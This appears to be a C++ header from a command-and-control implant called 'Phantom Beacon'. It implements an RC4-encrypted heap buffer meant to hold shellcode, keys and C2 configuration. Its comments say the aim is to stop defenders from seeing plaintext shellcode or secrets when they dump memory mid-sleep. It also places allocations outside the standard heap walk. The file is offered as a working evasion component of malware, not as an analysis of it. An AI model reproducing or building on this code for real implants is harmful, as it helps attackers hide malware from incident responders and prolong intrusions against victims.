#pragma once
// ============================================================================
//  secure_heap.h — Phantom Beacon Encrypted Heap (FOLIAGE-style)
//  ──────────────────────────────────────────────────────────────────
//  Sensitive buffers (shellcode, keys, C2 config) are stored encrypted
//  while not actively in use, then decrypted only for the brief window
//  they are read/written, then re-encrypted. A defender that dumps heap
//  memory mid-sleep sees ciphertext, not plaintext shellcode or secrets.
//
//  Design:
//    - Backing store is VirtualAlloc (RW), never the default CRT heap,
//      so allocations live in a region outside the standard heap walk.
//    - RC4 keystream for the body (fast, self-inverse) + 32-bit checksum
//      so a torn/bad decrypt is detectable instead of silently corrupt.
//    - lock()/unlock() toggles the plaintext/ciphertext state explicitly.
//    - Destructor wipes and frees — no plaintext lingers after scope exit.
// ============================================================================

#include <cstdint>
#include <cstddef>
#include <cstring>
#include <vector>

#ifdef _WIN32
#include <windows.h>
#else
#include <cstdlib>
#endif

namespace secure_heap {

// ── RC4 keystream (deterministic, self-inverse) ────────────────────────────
struct Rc4 {
    uint8_t S[256];
    uint8_t i = 0, j = 0;

    void key(const uint8_t* k, size_t len) {
        for (int x = 0; x < 256; ++x) S[x] = static_cast<uint8_t>(x);
        uint8_t jj = 0;
        for (int x = 0; x < 256; ++x) {
            jj = static_cast<uint8_t>(jj + S[x] + k[x % len]);
            uint8_t t = S[x]; S[x] = S[jj]; S[jj] = t;
        }
        i = j = 0;
    }
    uint8_t next() {
        i = static_cast<uint8_t>(i + 1);
        j = static_cast<uint8_t>(j + S[i]);
        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;
        return S[static_cast<uint8_t>(S[i] + S[j])];
    }
    void crypt(uint8_t* d, size_t len) {
        for (size_t x = 0; x < len; ++x) d[x] ^= next();
    }
};

/// 32-bit FNV-1a checksum (fast, used to validate decrypt integrity).
inline uint32_t fnv1a(const uint8_t* d, size_t len) {
    uint32_t h = 2166136261u;
    for (size_t i = 0; i < len; ++i) {
        h ^= d[i];
        h *= 16777619u;
    }
    return h;
}

// ── SecureBuffer ───────────────────────────────────────────────────────────
// RAII encrypted buffer. Construct with plaintext (or empty), it is stored
// encrypted. Call unlock() to get a plaintext view, then lock() to re-seal.
//
// Memory layout (all encrypted at rest except the 12-byte header):
//   [0..3]   magic (validity)
//   [4..7]   payload length
//   [8..11]  payload checksum (FNV-1a)
//   [12..]   payload bytes (encrypted with RC4)
// ───────────────────────────────────────────────────────────────────────────
class SecureBuffer {
public:
    SecureBuffer() = default;

    explicit SecureBuffer(const uint8_t* plain, size_t len) {
        assign(plain, len);
    }

    explicit SecureBuffer(const std::vector<uint8_t>& plain) {
        assign(plain.data(), plain.size());
    }

    ~SecureBuffer() { wipe(); }

    // non-copyable, movable
    SecureBuffer(const SecureBuffer&) = delete;
    SecureBuffer& operator=(const SecureBuffer&) = delete;

    SecureBuffer(SecureBuffer&& o) noexcept { move_from(o); }
    SecureBuffer& operator=(SecureBuffer&& o) noexcept {
        if (this != &o) { wipe(); move_from(o); }
        return *this;
    }

    /// Set the payload (stored encrypted).
    void assign(const uint8_t* plain, size_t len) {
        wipe();
        if (!plain || len == 0) return;

        size_t total = HEADER + len;
        mem_ = alloc(total);
        if (!mem_) return;
        cap_ = total;
        len_ = len;

        // build key material from ASLR + address entropy
        derive_key();

        // write header
        write_u32(mem_, MAGIC);
        write_u32(mem_ + 4, static_cast<uint32_t>(len));
        write_u32(mem_ + 8, fnv1a(plain, len));

        // encrypt body
        Rc4 rc; rc.key(key_, 16);
        memcpy(mem_ + HEADER, plain, len);
        rc.crypt(mem_ + HEADER, len);

        sealed_ = true;
    }

    /// Return a plaintext pointer valid until lock() or destruction.
    /// Re-encrypts nothing on the way out; caller must call lock().
    uint8_t* unlock() {
        if (!mem_ || !sealed_) return nullptr;
        Rc4 rc; rc.key(key_, 16);
        rc.crypt(mem_ + HEADER, len_);
        sealed_ = false;
        return mem_ + HEADER;
    }

    const uint8_t* unlock() const {
        return const_cast<SecureBuffer*>(this)->unlock();
    }

    /// Re-seal the payload (encrypt the plaintext back).
    void lock() {
        if (!mem_ || sealed_) return;
        Rc4 rc; rc.key(key_, 16);
        rc.crypt(mem_ + HEADER, len_);
        sealed_ = true;
    }

    /// Verify integrity (checksum) and return true if payload is intact.
    bool verify() const {
        if (!mem_) return len_ == 0;
        if (read_u32(mem_) != MAGIC) return false;
        uint32_t stored_len = read_u32(mem_ + 4);
        if (stored_len != len_) return false;
        uint32_t stored_crc = read_u32(mem_ + 8);

        // decrypt a copy, check, re-encrypt
        Rc4 rc; rc.key(key_, 16);
        uint8_t* body = mem_ + HEADER;
        rc.crypt(body, len_);
        uint32_t actual = fnv1a(body, len_);
        rc.crypt(body, len_);
        return actual == stored_crc;
    }

    size_t size() const { return len_; }
    bool empty() const { return len_ == 0; }

private:
    static constexpr uint32_t MAGIC = 0x50484E54u; // "PHNT"
    static constexpr size_t HEADER = 12;

    uint8_t* mem_ = nullptr;
    size_t len_ = 0;
    size_t cap_ = 0;
    uint8_t key_[16] = {0};
    bool sealed_ = false;

    static uint8_t* alloc(size_t n) {
#ifdef _WIN32
        return static_cast<uint8_t*>(
            VirtualAlloc(nullptr, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
#else
        return static_cast<uint8_t*>(calloc(1, n));
#endif
    }
    static void free_mem(uint8_t* p, size_t n) {
        if (!p) return;
#ifdef _WIN32
        // wipe before free
        volatile uint8_t* v = p;
        for (size_t i = 0; i < n; ++i) v[i] = 0;
        VirtualFree(p, 0, MEM_RELEASE);
#else
        volatile uint8_t* v = p;
        for (size_t i = 0; i < n; ++i) v[i] = 0;
        free(p);
#endif
    }

    void derive_key() {
        // Entropy: ASLR address of the buffer + stack address + a counter
        uintptr_t addr = reinterpret_cast<uintptr_t>(mem_);
        uintptr_t sp = reinterpret_cast<uintptr_t>(&key_);
        uint64_t mix = static_cast<uint64_t>(addr) ^ (static_cast<uint64_t>(sp) << 21);
        for (int k = 0; k < 16; ++k)
            key_[k] = static_cast<uint8_t>((mix >> (k * 3)) & 0xFF) ^ static_cast<uint8_t>(0x5A + k * 7);
    }

    static void write_u32(uint8_t* p, uint32_t v) {
        p[0] = static_cast<uint8_t>(v & 0xFF);
        p[1] = static_cast<uint8_t>((v >> 8) & 0xFF);
        p[2] = static_cast<uint8_t>((v >> 16) & 0xFF);
        p[3] = static_cast<uint8_t>((v >> 24) & 0xFF);
    }
    static uint32_t read_u32(const uint8_t* p) {
        return static_cast<uint32_t>(p[0]) |
               (static_cast<uint32_t>(p[1]) << 8) |
               (static_cast<uint32_t>(p[2]) << 16) |
               (static_cast<uint32_t>(p[3]) << 24);
    }

    void wipe() {
        if (mem_) { free_mem(mem_, cap_); mem_ = nullptr; }
        len_ = cap_ = 0;
        sealed_ = false;
        volatile uint8_t* k = key_;
        for (int i = 0; i < 16; ++i) k[i] = 0;
    }

    void move_from(SecureBuffer& o) {
        mem_ = o.mem_; len_ = o.len_; cap_ = o.cap_; sealed_ = o.sealed_;
        memcpy(key_, o.key_, 16);
        o.mem_ = nullptr; o.len_ = 0; o.cap_ = 0; o.sealed_ = false;
    }
};

}  // namespace secure_heap
